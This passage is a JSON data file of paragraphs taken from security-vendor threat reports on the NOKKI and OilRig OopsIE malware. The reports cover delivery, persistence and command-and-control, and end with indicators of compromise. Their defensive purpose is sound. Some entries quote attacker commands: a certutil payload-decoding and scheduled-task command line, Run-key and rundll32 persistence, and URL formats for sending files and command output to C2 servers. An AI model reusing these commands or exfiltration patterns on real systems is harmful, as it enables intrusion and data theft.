                "The earliest observed attack delivering NOKKI took place in January 2018.",
                "This attack leverages a Microsoft Windows executable file using a PDF icon in an attempt to trick the victim into launching the file.",
                "The malware sample contains the properties seen in Table 1:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 January NOKKI properties"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware is capable of collecting information on the victim machine, dropping, and executing a payload, as well as dropping and opening a decoy document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware will collect data from the victim machine and write this information to LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp.",
                "The following information is collected from the victim:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This specific function shares significant code overlap with the KONNI tool first discovered by Talos."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The NOKKI payload is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process.",
                "Persistence is achieved by writing the file path to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svstartup registry key."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After being executed and establishing persistence, NOKKI then connects to 101.129.1[.]104 for C2 communication via FTP.",
                "This IP does not have a domain name resolution; however, WHOis shows the IP assigned to China Central Television."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy document is written to the same file path as the initial dropper, however, the extension is renamed to .pdf and becomes a legitimate document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on the decoy document contents and language, the attack may target"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cambodian speakers with an interest in Cambodian political matters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 shows the decoy document used for this sample:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Decoy document for b8120d5c9c2c889b37aa9e37514a3b4964c6e41296be216b327cdccd2e908311"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "April 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In early April 2018, another attack was observed delivering the NOKKI payload.",
                "This attack leveraged a malicious executable with an .scr extension that had the original filename referring to the Russian Ministry of Foreign Affairs and its contents can be found online."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The file contains the properties as seen in Table 2:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 April NOKKI Properties"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample contained the same PDB string within it as sample from January 2018.",
                "Functionally, it was nearly identical in its behavior as the previous attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike the previously witnessed attack that possibly targeted Cambodian language speakers with an interest in Cambodian political matters, the decoy document used in this attack is written Cyrillic and contains content related to Russian political matters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the .scr file is executed, the NOKKI payload is installed onto the victim host which then connects to the IP resolving to a likely compromised but legitimate South Korean science and technology university website."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy document for 9bf634ff0bc7c69ffceb75f9773c198944d907ba822c02c44c83e997b88eeabd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The content of the decoy document in Figure 2 is a publicly available.",
                "Google Translate roughly translates to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "About the meeting of the State Secretary - Deputy Minister of Foreign Affairs of Russia GB Karasin and the Director of the Institute of Strategic and Interregional Studies under the President of Uzbekistan, VI Norov"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A second sample was discovered in April 2018, also written Cyrillic and containing content related to Russian political matters.",
                "This file had the following properties as seen in Table 3:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 Second April NOKKI Properties"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Again, we see consistency both in the embedded PDB string, as well as the functionality of the sample itself.",
                "This particular sample connects to an IP address to which a likely legitimate but compromised website of a research institute in South Korea resolves.",
                "This server has also likely been compromised and repurposed by the adversary."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "May 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In May 2018, Unit 42 observed an attack using malware with a filename of briefinglist.exe being downloaded from the somewhat redacted following URL.",
                "Again, it is a likely compromised but legitimate South Korean website and the contents written Cyrillic and containing content related to Russian political matters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://mail.[removed].co[.]kr/de/de_includes/mail/yandex.ru/download.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample has the following properties as seen in Table 4:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4. Third May NOKKI Properties"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample remains consistent with previous samples of NOKKI in terms of functionality and the embedded PDB string."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload communicates with 145.14.145[.]32, which resolves to files.000webhost[.]com.",
                "This same host was witnessed in previously reported KONNI malware activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "July 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In July 2018, a South Korean engineering organization was identified as compromised and hosting malware and C2 infrastructure on their webserver since at least May 2018.",
                "Again, a file in Cyrillic with a name referring to the Russianpolitical matters was being distributed from the http://mail.[removed].co[.]kr/common URL."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike attacks leading up to this point, an executable file was not used as the initial malware file.",
                "Instead, this attack used a Microsoft Word document leveraging malicious macros to deliver the payload to the victim.",
                "Upon opening the file and enabling macros, the document downloaded both the payload and displayed a decoy document referencing political matters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NOKKI Malware Family"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From the samples discussed in this blog, we were able to identify two distinct variants of NOKKI.",
                "The earlier variant witnessed in attacks between January 2018 to May 2018 made use of FTP for C2 communications.",
                "Alternatively, the newer variant witnessed since June 2018 made use of HTTP.",
                "While both variants used different network protocols for communication, they both used the same file path structure on the remote C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The older variant begins by looking for the presence of the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%TEMP%\\ID56SD.tmp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If this file does not exist, the malware will generate a random string of 10 upper-case alphabetic characters.",
                "This string will ultimately be used as the victims identifier.",
                "It will also create the %TEMP%\\stass file and write the value of a to it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware continues to spawn a new thread that is responsible for network communication.",
                "Within an infinite loop, this malware will continue connecting to its C2 server via FTP."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After successful connection to the C2, it will write the previously written stass file to the servers public_html folder.",
                "It will also upload the previously created uplog.tmp file to the remote server.",
                "After the upload is completed, NOKKI will then delete the local copy on the infected host.",
                "Finally, NOKKI will check for the presence of the [id]-down file on the C2 server, where [id] is the 10 character alphabetic string created prior.",
                "Should this file exist, it will be downloaded and written to %TEMP%\\svchostav.exe prior to being executed in a new process.",
                "After it is executed, the malware deletes the file on the C2 server.",
                "The malware will then sleep for 15 minutes between loops."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The newer variant operates in a slightly different manner."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this case, NOKKI begins by extracting and dropping an embedded DLL to the %LOCALAPPDATA%\\MicroSoft UpdateServices\\Services.dll path.",
                "One of two DLLs may be dropped, either a 32-bit or a 64-bit compiled options.",
                "The appropriate DLL will be dropped based on the victim hosts CPU architecture."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While these DLLs are different architectures, they perform the same functions.",
                "After the DLL is written, the malware loads it via the following command-line:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "rundll32.exe [%LOCALAPPDATA%\\MicroSoft UpdateServices\\Services.dll] install"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the malware will write the following registry key to ensure persistence on the victim host:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\qivService - C:\\\\Windows\\\\System32\\\\rundll32.exe \"[%LOCALAPPDATA%\\MicroSoft UpdateServices\\Services.dll]\" install"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payloads install function makes a call to SetWindowsHookEx with a thread ID of 0, resulting in the function being injected into every GUI process running on the victim machine.",
                "This particular process is referenced in this forum post."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DllMain function of this payload begins by comparing the process executable name, seeking out the explorer.exe process.",
                "In the event it is not loaded in the context of this process, nothing occurs.",
                "If the malware is running within explorer.exe, it will load its own HTTPStart exported function, which performs the malicious actions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It begins by writing the ID56SD.tmp file in its current working directory (CWD).",
                "A unique randomly chosen 10-byte alphabetic string is written to this file, which will be used as an identifier for the victim.",
                "A file named stass is also written in the CWD, with a single byte of a."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload proceeds to enter an infinite loop, with a 15 minute delay between iterations.",
                "The loop begins by reading in the previously written stass file and uploading it to its embedded C2 server via HTTP."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data is encoded with base64 and uploaded via a POST parameter of data.",
                "Additionally, the victims identifier and the current timestamp is uploaded via a POST parameter of subject."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 HTTP request made by NOKKI payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this upload request is made, the malware looks for the presence of a file named uplog.tmp.",
                "In the event this file exists, it is uploaded via the same method as previously noted.",
                "After this file is uploaded via HTTP, the local file is deleted.",
                "While this file is not present originally in this malware sample, in other NOKKI variants, it has been observed containing the victims system information."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware then looks for the presence of the upfile.tmp file.",
                "Again, if this file exists, it is uploaded to the remote server and the local file is deleted."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the malware will look for the presence of the following remote files, where [id] is the victim identifier:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the down file is available, it is written to %TEMP%\\wirbiry2jsq3454.exe and executed.",
                "If the [id]-down file is available, it is written to %TEMP%\\weewyesqsf4.exe and executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During execution, a remote module was downloaded from the down URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This module is responsible for collecting the following information and writing it to the %LOCALAPPDATA%\\MicroSoft UpdateServices\\uplog.tmp file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This module acted in an identical way as the information collection function witnessed in the older variant of NOKKI."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comparison to KONNI"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The NOKKI malware family differs from KONNI in a number of ways.",
                "Unlike KONNI, NOKKI is modular in nature, with multiple steps taken between the initial infection and the final payload(s) being delivered.",
                "Early versions of NOKKI observed between January 2018 to May 2018 used a remote FTP server to ultimately accept commands and download additional modules.",
                "While newer versions of NOKKI starting in June 2018 use HTTP, the communication is quite different from the previously reported KONNI malware, both in the URI structure and data being sent.",
                "In addition, while the KONNI samples used C2 infrastructure set up specifically by the adversary, NOKKI mostly leveraged what appeared to be likely compromised legitimate servers for their infrastructure."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5. URI differences between NOKKI and KONNI"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While we consider these malware families to be separate, we identified some similarities with KONNI.",
                "In addition to overlapping infrastructure between KONNI and NOKKI, a NOKKI module used to collect victim information was observed exhibiting very similar characteristics to the KONNI victim information collection function as seen in Figure 4.",
                "This same function was also observed in early instances of the dropper used to deploy NOKKI between January 2018 and May 2018."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Similarities between KONNI malware family and NOKKI module"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on the similarities witnessed, we think it is highly probable there is some amount of code sharing and likely a single adversary group involved."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The adversary operating the NOKKI malware family appears to have begun using NOKKI in January 2018 and has continued their activity through 2018.",
                "At this time, we can only speculate who these series of attacks may be attributed to based on tenuous relationships.",
                "However, there is significant evidence from our attack telemetry and victimology indicating the operator has a strong interest in specific regions of the world such as Eurasia, the Korean Peninsula, and Southeast Asia.",
                "The general tactics used to deliver NOKKI are similar in nature to the actors behind a previously identified malware, KONNI.",
                "Additionally, there are overlaps both in code and some infrastructure with previously reported KONNI activity.",
                "Unlike KONNI, however, this particular malware family makes use of compromised servers for both hosting and C2 operations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The NOKKI malware itself has been updated in the short period of time it has been observed, moving from FTP to HTTP for C2 operations.",
                "The malware is modular in nature, and based on analysis of the information gathering module, it is highly likely the NOKKI operators are the same as the KONNI operators.",
                "Unit 42 will continue to monitor this malware family and the threat actor responsible."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected by the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "July 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "June 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "May 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "April 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Early April 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "January 2018 Attack"
            ]
        }
    ],
    "2f695c4cc7fd95ab4aef991ea898d8079bc239a7": [
        {
            "type": "paragraph",
            "content": [
                "The OilRig group remains highly active in their attack campaigns while they continue to evolve their toolset.",
                "On January 8, 2018, Unit 42 observed the OilRig threat group carry out an attack on an insurance agency based in the Middle East.",
                "Just over a week later, on January 16, 2018, we observed an attack on a Middle Eastern financial institution.",
                "In both attacks, the OilRig group attempted to deliver a new Trojan that we are tracking as OopsIE.",
                "The January 8 attack used a variant of the ThreeDollars delivery document, which we identified as part of the OilRig toolset based on attacks that occurred in August 2017.",
                "However, the attack on January 16 did not involve ThreeDollars at all.",
                "Instead, this attack involved delivering the OopsIE Trojan directly to the victim, most likely using a link in a spear phishing email.",
                "Interestingly, the targeted organization in the January 16 attack had already been targeted by the OilRig group a year ago on January 2017.",
                "This repeat attack may suggest that the adversaries have lost their foothold in the targeted organization, or that it may be considered a high value target.",
                "A New Attack\nOn January 8, 2018, the OilRig threat group sent an email with the subject Beirut Insurance Seminar Invitation to an insurance agency in the Middle East.",
                "The OilRig group sent two emails to two different email addresses at the same organization within a six minutes time span.",
                "The recipient email addresses suggest they may be the addresses used for specific regional branches of the targeted organization.",
                "Both emails originated from the same address.",
                "The email address is associated with the Lebanese domain of a major global financial institution.",
                "However, based upon the captured session data, it is highly likely the source email address was spoofed.",
                "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars.",
                "Examining this sample of ThreeDollars reveals that it contains a new payload, which we have named OopsIE.",
                "In the January 16, 2018 attack, we observed OilRig attacking an organization it previously targeted in January 2017.",
                "In this case, the ThreeDollars delivery document was not used and instead an attempt was made to deliver the OopsIE Trojan directly to the targeted organization, likely via a link within an email.",
                "The Trojan was directly downloaded from the command and control server for OopsIE, signifying that this server was also used for staging.",
                "This suggests that due to the January 2017 attack, the targeted organization may have taken actions to counter known OilRig TTPs, in this case delivering malicious macro documents, causing the OilRig operators to adopt a different delivery tactic.",
                "We also identified another sample of ThreeDollars, created on January 15, 2017 with the file name strategy preparation.dot.",
                "While this sample was very similar to the Seminar-Invitation.doc sample it also had some significant differences.",
                "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document.",
                "While this is not a new tactic, this is the first instance where we have observed the OilRig using it in their playbook.",
                "Typically, password protected documents is commonly used by adversaries as an evasion tactic to bypass automated analysis mechanisms due to the password requirement for successful execution.",
                "As we have observed throughout our tracking of the OilRig group, adopting proven tactics has been a common behavior over time.",
                "ThreeDollars Document Analysis\nThe samples of ThreeDollars we collected in these attacks are structurally very similar to the first sample we analyzed in October 2017, down to the lure image used to trick the recipient into clicking the Enable Content button to execute the malicious macro.",
                "The images used in the January 2018 attacks were the exact same in each sample, verified by file hash.",
                "Figure 1 shows the lure image extracted from the newer attacks, and the lure image from the first sample we analyzed.",
                "While it is unsurprising that attacks originating from the same adversary group would use the same resource over time, we analyzed exactly how similar these lure images were."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Superficially, we can immediately see the images are quite similar, but with some glaring differences.",
                "The image from the August 2017 attack for example, is significantly larger, using an image resolution of 3508 pixels x 4961 pixels which is also the exact resolution for a sheet of A3 paper at 300 dpi.",
                "It also contains some additional artifacts in the image, such as the inclusion of the Microsoft logo as well as additional text, specifically against unauthorized use.",
                "In comparison, the newer lure image appears to be horizontally distorted due to it being resized to fit into the constraints of the document.",
                "In addition, the period after This document is protected is misaligned.",
                "By overlaying these two lure images and accounting for the newer images distortion, we are able to clearly visualize that the newer image is highly likely to be a cropped and edited version of the August 2017 image.",
                "Examining the color code used in both images also shows they are the exact same, #da3b01.",
                "The dimensions of the newer image are roughly 40% of the older October image, suggesting that after cropping and editing the newer image, the creator is also likely to have resized the image.",
                "One peculiar artifact from the original image is the usage of the st (unicode \\uFB06) ligature in the word against.",
                "This is a highly uncommon glyph and is not generally available in standard keyboard layouts.",
                "This may suggest that the string was machine generated rather than directly inputted from a keyboard.",
                "The use of this glyph also may suggest that the actor is not a native English speaker.",
                "Malicious Macro Analysis\nWhen the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the Enable Content button.",
                "When button is clicked, a malicious macro is silently run which installs then executes a payload on a system.",
                "A decoy image is also displayed to the victim to lower suspicion of malicious activity.",
                "The decoy message that is eventually presented to the victim does not actually show the expected content of an insurance seminar invitation as presented in the delivery email.",
                "Instead, it displays a fake error message of NullRefrencedException! error has occurred in user32.dll by 0x32ef2121 within the Word document, as seen in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy message displayed by the malicious macro in ThreeDollars delivery document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the decoy in Figure 2 is displayed, the macro will search the document for the delimiter ###$$$ and write the base64 encoded text that follows this delimiter to the file %APPDATA%\\Base.txt.",
                "The macro then creates a scheduled task named SecurityAssist that runs after waiting one minute.",
                "The SecurityAssist task is responsible for running the following command line command that uses the Certutil application to decode the base64 encoded data in Base.txt and saves the decoded data to the file %PROGRAMDATA%\\IntelSecurityAssistManager.exe:\ncmd.exe /c",
                "Certutil -decode %appdata%\\Base.txt %programdata%\\IntelSecurityAssistManager.exe & SchTasks /Delete",
                "/F",
                "/TN SecurityAssist\nThe macro also creates a second scheduled task named Conhost that waits two minutes and runs a VBScript %APPDATA%\\chkSrv.vbs.",
                "The macro saves the chkSrv.vbs script to the system, which is responsible for running the IntelSecurityAssistManager.exe payload (OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the Base.txt file, the ThreeDollars document, and the chkSrv.vbs script.",
                "OopsIE Trojan Analysis\nThe OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with ConfuserEx v1.0.0.",
                "To run persistently on the system, the Trojan will first create a VBScript file:\nSpecialFolder.CommonApplicationData\\srvResesponded.vbs\nthat contains:\nCreateObject(\"WScript.Shell\").Run(\"%app%\")\nThe Trojan replaces the %app% string in the above VBScript with the path to its executable.",
                "Finally, the Trojan creates a scheduled task to run itself every three minutes by running the following command on the command prompt after replacing the %path% string with the path to the srvResesponded.vbs VBScript:",
                "SchTasks /Create",
                "/SC",
                "MINUTE /MO 3",
                "/TN \"InetlSecurityAssistManager\" /TR \"wscript %path%\" /f\nThe Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer application object within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw.",
                "The Trojan extracts and loads this embedded assembly by concatenating the contents of two resources named S1 and S2 and decompresses the resulting data using the GZipSteam class.",
                "The resulting Interop.",
                "SHDocVw .NET assembly is packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0.",
                "The concatenation of resources to construct embedded assemblies is not a new technique for the OilRig group, as they used the very same technique in October 2017 in their ISMInjector tool to construct its embedded libraries Joiner.dll and Inner.dll.",
                "By using the InternetExplorer application object, all C2 related requests will look as if they came from the legitimate browser and therefore will not contain any anomalous fields within the request, such as custom User-Agents.",
                "The OopsIE Trojan is configured to use a C2 server hosted at:\nwww.msoffice365cdn[.]com\nThe Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server's response looking for content within the tags <pre> and </pre>.",
                "The initial HTTP request acts as a beacon, as shown in the image below.",
                "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:\nhttp://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)>\nThe Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run.",
                "The C2 server will respond to the Trojans request by echoing the value <hex(Environment.UserName/Environment.MachineName)> if it wishes to provide additional commands.",
                "If the C2 server does not respond with the appropriate echoed data, the Trojan will create a file named srvCheckresponded.tmp in the SpecialFolder.CommonApplicationData folder and write nothing to it before exiting.",
                "If the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what commands the C2 wishes to run by issuing a request to the following URL:\nhttp://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)>\nAfter issuing the what command, the Trojan will parse the C2's response for the string Oops, which the Trojan will treat as the C2 making a mistake and will exit.",
                "Otherwise, the Server will respond with a command followed by a set of parameters, split up by the delimiter <>:\n[command]<>[parameters for command in hexadecimal format]\nThe available commands are:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The parameters for each command are issued in hexadecimal format.",
                "For instance, the character A would be represented by the two characters 41, which is the hexadecimal representation of that character.",
                "This hexadecimal format is used extensively throughout this Trojan.",
                "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs.",
                "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:\nhttp://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)>\nThe upload command (2) writes data provided by the C2 to a specified file.",
                "The parameters supplied to this command include hexadecimal values for the binary data and the filename, which are split up by a delimiter of (!).",
                "The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:\nhttp://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<",
                "hex(\"File Uploaded\")>\nThe download command (3) reads the contents of a specified file and sends the data to the C2 server.",
                "If the file does not exist, the Trojan will send the C2 server a message < File Not Found > by sending the following URL:\nhttp://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\"< File Not Found >\")>\nIf the file exists, the Trojan will read the contents of the specified file and compresses the contents using the GZipStream class.",
                "The Trojan then gets the hexadecimal values of the compressed data and will replace the following hexadecimal values on each line with ASCII characters to further compressed the data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the SpecialFolder.CommonApplicationData folder named as:\n<day><hour><second><millisecond>.tmp\nThe Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to a URL structured as follows:\nhttp://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of hexadecimal formatted file contents)>\nOnce all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will send a request to the C2 server to notify the data has been successfully transmitted via a URL structured as follows:\nhttp://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZFinish\n\nOverlaps with Previous OilRig Group Attacks\nSince May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig group.",
                "As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure.",
                "This type of commonality is unsurprising as we are assuming a single adversary, and is an excellent example of how adversaries will often times reuse certain tactics and techniques whether it is for efficiencies sake or sheer laziness.",
                "In the attacks described above, we observed a new payload being delivered using a previously unknown command and control domain.",
                "However, as we continued to follow the trail of evidence, we found immediate links to past attacks and common artifacts from the OilRig group.",
                "The most obvious link is the reuse of the ThreeDollars delivery document, which we had previously observed delivering a different payload.",
                "However, we also found other connection to other OilRig group attacks starting with the command and control domain, msoffice365cdn[.]com.",
                "Beginning with the WHOIS record, we see that the domain was registered by emilia.jones@mail.ru.",
                "Examining additional domains registered to this email address reveals the domain office365-management[.]com, which we previously identified in October 2017 to be an OilRig C2.",
                "Continuing to examine the WHOIS records, we see that a fairly unique phone number is also used in the record.",
                "It is only found in one other WHOIS record, for the domain office365-technical[.]info, which is registered to leonard.horner@mail.ru.",
                "Based off the relational links and thematic similarity of the domain name, we have strong reason to believe this domain and registrant are also attributed to the OilRig group.",
                "Moving onto IP resolutions of the identified domains proves to be fruitful as well.",
                "Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240.",
                "In addition, we find that 80.82.79.221 shares an SSL certificate with a small number of other IP addresses, one of which is 185.162.235.29.",
                "This IP resolves to office365-management[.]com which was one of the domains registered by the emilia.jones@mail.ru entity.",
                "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017.",
                "Lastly, we examine the delivery document itself.",
                "Although we have already identified the documents as a variant of the ThreeDollars tool and analyzed the lure image used in this document in comparison to the previously used lure image, additional artifacts also exist to further strengthen the relational link of this sample and the attack to previous OilRig attributed tools and attacks.",
                "In this case, one of the ThreeDollars samples we collected contained a unique author name of J-Win-7-32-Vm.",
                "We had previously observed this author name in use once before, in the very first ThreeDollars document we collected that we had reported on in August 2017.",
                "Conclusion\nThe OilRig group continues to remain a highly active adversary in the Middle East region.",
                "This group has repeatedly shown evidence of a willingness to adapt and evolve their tactics, while also reusing certain aspects as well.",
                "We have now observed this adversary deploy a multitude of tools, with each appearing to be some form of iterative variation of something used in the past.",
                "However, although the tools themselves have morphed over time, the plays they have executed in their playbook largely remain the same when examined over the attack life cycle.",
                "We have added this play to the OilRig playbook, which can be viewed online via our Playbook Viewer.",
                "Palo Alto Networks customers are protected from this threat by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise\nThreeDollars SHA256\nec3f55cac3e8257d6d48e5d543db758fed7d267f14f63a6a5d98ba7a0fab6870\n81eb43ad46ed39bd4b869c709e5e468a6fc714485da288aaa77c80291ce6db8c\n\nOopsIE SHA256\n9a040cdd7c9fcde337b2c3daa2a7208e225735747dd1366e6c0fcbc56815a07f\n231115a614c99e8ddade4cf4c88472bd3801c5c289595fc068e51b77c2c8563f\n\nOopsIE C2\nwww.msoffice365cdn[.]com\n\nRelated Infrastructure\noffice365-management[.]com\noffice365-technical[.]info\nmsoffice-cdn[.]com\n80.82.79.221\n80.82.79.240\n185.162.235.29"
            ]
        }
    ],
    "309f8649a030a586c12ae94a5d89bd3820be204a": [
        {
            "type": "paragraph",
            "content": [
                "The OilRig group maintains their persistent attacks against government entities in the Middle East region using previously identified tools and tactics.",
                "As observed in previous attack campaigns, the tools used are not an exact duplicate of the previous attack and instead is an iterative variant.",
                "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment.",
                "The attachment was identified as a variant of the OopsIE trojan we identified in February 2018.",
                "In this iteration of OopsIE, the general functionality largely remained the same but contained the addition of anti-analysis and anti-virtual machine capabilities to further evade detection from automated defensive systems.\n\nAttack Details\nIn July 2018, we reported on a wave of OilRig attacks delivering a tool called QUADAGENT involving a Middle Eastern government agency.",
                "During that wave, we also observed OilRig leveraging additional compromised email accounts at the same government organization to send spear phishing emails delivering the OopsIE trojan as the payload instead of QUADAGENT.",
                "The OopsIE attack also targeted a government agency within the same nation state, though a different organization than the one targeted delivering QUADAGENT.",
                "The email subject was in Arabic, which translated to Business continuity management training.",
                "The email was sent to an address belonging to a user group, rather than a specific individuals email address.",
                "Based on open source data collection, it appears the targeted group had publicly published several documents regarding business continuity management on the Internet, indicating the lures were purposefully crafted for this specific attack.\n\nEvasion Techniques\nThe OopsIE variant delivered in this attack begins its execution by performing a series of anti-VM and sandbox checks.",
                "If any of the checks described in Table 1 are successful, the Trojan will exit without running any of its functional code.",
                "These evasion techniques are meant to thwart automated analysis in an effort to avoid detection."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 List of anti-vm and anti-sandbox techniques used by OopsIE\n\u00a0\nMost of these evasion techniques have been observed in other malware families; however, a few of the techniques were more novel.",
                "First, we had not seen the CPU fan check used before, and upon testing the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, when we ran the same query in a physical system running Windows 7, we saw the contents of the Win32_Fan class, as seen in Figure 2.",
                "The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 WMI query for Win32_Fan run on a physical system showing statistics"
            ]
        },
        {
            "type": "paragraph",
            "content": [
